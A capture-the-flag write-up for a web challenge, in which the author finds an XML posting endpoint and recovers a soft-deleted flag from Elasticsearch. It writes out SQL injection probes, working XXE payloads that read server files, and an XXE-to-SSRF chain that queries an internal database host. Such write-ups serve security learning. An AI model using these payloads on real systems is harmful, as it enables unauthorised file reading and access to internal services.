# Challenge link
URL:      [http://184.72.87.9:8013/](http://184.72.87.9:8013/) (maybe the server was shut down)

# Challenge description
This website is a forum where people can make posts, though it's so broken right now that you can probably only search them. It turns out that someone posted something top secret and later deleted it, but was it truly deleted?

# Challenge source file
Blackbox (No source)

# Difficulty
Above medium

# Approach
- When I connected to the website, all I saw was just a simple page:
  ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/15d6d767-9590-4297-8967-8f4355818cd2)

- First I tried to input 'a' into the search box and search:
  ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/20e906f9-3c77-45d3-bf45-5a81a912b2f1)

- Maybe the web app is vulnerable to SQLi, so I also tried to inject *' or 1=1--*, and I found that the results' order was changed:
- ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/ccd0e751-9cd9-461a-9ed8-d90121a6ed72)

- I should check with *' or 1=2--* to ensure that it was SQLi, but the results stay the same (?). Maybe the database they use is not SQL.
- If you read the results' messages, you can find some hints:
  ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/007f8faa-8437-4774-8574-1498b4c5b90d)

- Hackerman said that he should try another way to access the db. Since I'm not as skilled as him, let's follow his idea.
- If you view-source by CTRL + U, you will see this:
  ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/562b78a0-ec5e-4733-bba1-8ecacc74b549)

- It's a hidden path here, so let's check it. A page for posting messages appeared. Input something and send it:
  ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/2757d2f7-8538-49f6-be6e-a0e78b20a322)

- I also checked for cookies but found nothing. This time Burp Suite is a good choice to analyze requests. I found a request that contains an XML payload:
  ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/1be00fcb-3876-43bc-ab7c-67eae6d8fd2b)

- If this is the only way to react to the db, an XXE attack must be performed. So, let's send it to Repeater:
  ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/0da9ae3b-08a9-4c4c-8311-29282f297a6f)

- The original payload:
  ```
  <?xml version="1.0" encoding="UTF-8" standalone="no"?><post author="CTF Participant" id="0" title="wee"><message>ew</message></post>
  ```
- I modified the payload so that I can read the file from the server:
  ```
  <?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE xxe [<!ENTITY file SYSTEM "file:///">]><post author="CTF Participant" id="0" title="wee"><message>&file;</message></post>
  ```
  Then send a request and see the result:
  ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/2cbe6e68-7b62-4ab4-a73b-163bfe71ef37)

- Successfully in reading files, now attack phases.
# Problem-solving
  ## Find the type of database
  - Because they use a db and I don't know what type of db they used, I should take a look at the source file. First with the challenge source file (used file path: file:///JustGoAround/src/main/resources/):
    ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/465dc83b-e273-4403-b5c6-46ae238a1fd9)

  - Usually, *application.properties* is a file that contains the data about server, db version, ... so I read it:
    ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/b210a267-90a3-42d6-9931-f43545f813db)

    ```
    spring.datasource.url=http://${ELASTIC_HOST:db}:9200
    ```
    
  - According to the information, the server uses something called *spring* and *Elastic*. Since I don't know anything about it, let's search.

  ## Information gathering
  - When I search Google, I found these two useful articles:
    [Spring Framework](https://docs.spring.io/spring-framework/docs/3.2.x/spring-framework-reference/html/overview.html)
    [Elasticsearch](https://logz.io/blog/elasticsearch-tutorial/)
    
  - Looks like we have nothing to do with the framework, the remaining one is Elasticsearch. According to the article, it is a NoSQL database. It's more interesting for you to know that it has a feature called *soft delete*. It means that the deleted records still remain in the database but you cannot see it normally.
    [Soft delete in Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/index-modules-history-retention.html)

  - The key is here. We know that the admin deleted the flag from the database, but maybe it was just a soft delete. Maybe, the record is still in the database, and I need to access the database. But how?

  ## Accessing database
  - There is no way that we can access the db from the front end, the only way is access via the server. The good news is that XXE not only accesses local server files but also can perform HTTP requests from inside it. I cannot access the db, but if I am the admin, why can't I?
  ## Server Side Request Forgery attack
  - The first thing that appeared in my mind was to fake a request and send it to the database. This can be achieved by sending an HTTP request via XXE. Because this request is from the server, the database "trusts" it and accept the request.
  - I changed the payload to perform an SSRF attack and sent it via Repeater:
    ```
    <?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE xxe [<!ENTITY file SYSTEM "http://db:9200">]><post author="CTF Participant" id="0" title="wee"><message>&file;</message></post>
    ```
    ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/ecf0fc25-5641-4af0-8edb-6e951269a8ca)

  - It works!!! The reason for HTTP://db:9200/ is according to *application.properties* as I mentioned above:
    ```
    spring.datasource.url=http://${ELASTIC_HOST:db}:9200
    ```
    The *${ELASTIC_HOST:db}* part means that by default, the hostname would be *db* if *ELASTIC_HOST* was not implemented by the server admin. 9200 was the port of the database for us to access.

  - The mission here is to read the deleted records. Since I didn't know the syntax of the Elasticsearch query, I asked ChatGPT. There are some queries that I used to finish the challenge:
    For listing the table names:
    ```
    http://db:9200/_cat/indices?v
    ```
    For searching the deleted records:
    ```
    http://db:9200/index_name/_doc/1
    ```
  - So my payloads are:
    ```
    <?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE xxe [<!ENTITY file SYSTEM "http://db:9200/_cat/indices?v">]><post author="CTF Participant" id="0" title="wee"><message>&file;</message></post>
    ```
    Result:
    ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/ec74a701-52f9-4f4f-861d-2a18c960792d)

    There is a table indexed as 'posts' and has 3 docs.deleted, so the flag must be in here.
    ```
    <?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE xxe [<!ENTITY file SYSTEM "http://db:9200/posts/_doc/1">]><post author="CTF Participant" id="0" title="wee"><message>&file;</message></post>
    ```
    Result:
    ![image](https://github.com/NoSpaceAvailable/SquareCTF/assets/143888307/12c9ede5-914f-4660-ab2d-39d20e99e161)

  - Flag: flag{tHISiSapRIVATEpOSTdONTlOOK}

  - Note: Don't worry if you spend hours getting stuck with the server's files. I brute-forced all the files inside it before thinking that there is another way to do this challenge :))))
